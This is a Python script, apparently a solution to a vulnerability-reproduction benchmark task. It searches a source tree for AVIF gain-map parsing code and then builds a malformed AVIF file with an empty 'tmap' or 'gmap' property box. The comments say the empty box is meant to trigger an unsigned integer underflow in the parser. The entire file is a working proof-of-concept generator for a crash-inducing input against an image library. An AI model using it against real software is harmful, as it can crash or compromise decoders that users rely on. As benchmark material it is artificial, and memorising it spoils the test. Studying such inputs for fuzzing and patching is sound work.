import struct
import tarfile
import os
import re
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default target box type (ISO Gain Map)
        target_4cc = b'tmap'
        found = False
        candidates = []

        # Function to scan source content for clues
        def scan_content(content):
            # Check for the vulnerable function names mentioned in the problem or known variants
            if 'decodeGainmapMetadata' in content or 'avifGainMapMetadataDecode' in content:
                # Find 4CC box types used nearby (e.g., inside 'quotes' or "quotes")
                matches = re.findall(r"['\"]([a-zA-Z0-9]{4})['\"]", content)
                local_cands = []
                for m in matches:
                    # Filter for likely gainmap-related box types
                    if m in ['tmap', 'gmap', 'clli', 'altr', 'tonm']:
                        local_cands.append(m.encode())
                return local_cands
            return []

        # Traverse the source tarball or directory
        try:
            if os.path.isdir(src_path):
                for root, dirs, files in os.walk(src_path):
                    if found: break
                    for file in files:
                        if file.endswith(('.c', '.cc', '.cpp', '.h')):
                            try:
                                with open(os.path.join(root, file), 'r', encoding='latin-1', errors='ignore') as f:
                                    cands = scan_content(f.read())
                                    if cands:
                                        candidates.extend(cands)
                                        # Prefer standard gain map types
                                        if b'tmap' in cands: target_4cc = b'tmap'; found = True; break
                                        if b'gmap' in cands: target_4cc = b'gmap'; found = True; break
                            except: pass
            elif tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, 'r') as tar:
                    for member in tar:
                        if found: break
                        if member.isfile() and member.name.endswith(('.c', '.cc', '.cpp', '.h')):
                            try:
                                f = tar.extractfile(member)
                                if f:
                                    cands = scan_content(f.read().decode('latin-1', errors='ignore'))
                                    if cands:
                                        candidates.extend(cands)
                                        if b'tmap' in cands: target_4cc = b'tmap'; found = True; break
                                        if b'gmap' in cands: target_4cc = b'gmap'; found = True; break
                            except: pass
        except Exception:
            pass

        # Fallback to found candidate or default
        if not found and candidates:
            target_4cc = candidates[0]

        # Construct a minimal AVIF file to trigger the parser
        # Structure: ftyp -> meta -> iprp -> ipco -> [Vulnerable Box]
        
        def make_box(tag, data):
            return struct.pack('>I', 8 + len(data)) + tag + data

        def make_full_box(tag, v, f, data):
            return struct.pack('>I', 12 + len(data)) + tag + struct.pack('>B', v) + struct.pack('>3s', f) + data

        # 1. ftyp box
        ftyp = make_box(b'ftyp', b'avif' + b'\x00\x00\x00\x00' + b'mif1' + b'avif')
        
        # 2. hdlr box (required for valid meta parsing)
        hdlr = make_full_box(b'hdlr', 0, b'\x00\x00\x00', b'\x00'*4 + b'pict' + b'\x00'*12 + b'name' + b'\x00')
        
        # 3. Vulnerable box construction
        # Vulnerability is "subtraction between unsigned types". 
        # We provide an empty payload so that any logic calculating (size - header_len) underflows.
        vuln_box = make_box(target_4cc, b'')
        
        # 4. ipco (Item Property Container) containing the vulnerable box
        ipco = make_box(b'ipco', vuln_box)
        
        # 5. iprp (Item Properties)
        iprp = make_box(b'iprp', ipco)
        
        # 6. meta box
        meta = make_full_box(b'meta', 0, b'\x00\x00\x00', hdlr + iprp)
        
        return ftyp + meta